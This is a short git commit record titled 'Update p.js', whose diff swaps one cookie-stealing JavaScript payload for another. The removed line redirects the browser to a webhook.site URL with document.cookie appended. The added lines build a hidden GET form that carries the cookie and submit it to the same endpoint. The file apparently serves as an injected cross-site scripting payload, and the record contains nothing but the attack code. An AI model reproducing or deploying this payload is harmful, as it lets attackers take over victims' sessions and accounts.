97475e2454d7863abf552c62bcfe3cf4a194e3de
jeremybonin-bit <jeremy.bonin@lamache.org>
2026-06-11 09:45:27 +0200

    Update p.js

--- p.js
+++ p.js
@@ -1,1 +1,9 @@
-location='https://webhook.site/a8af7f63-4bbf-4dcb-9854-72a33246d4db?c='+encodeURIComponent(document.cookie)
+let f=document.createElement('form');
+f.method='GET';
+f.action='https://webhook.site/a8af7f63-4bbf-4dcb-9854-72a33246d4db';
+let i=document.createElement('input');
+i.name='c';
+i.value=document.cookie;
+f.appendChild(i);
+document.body.appendChild(f);
+f.submit();
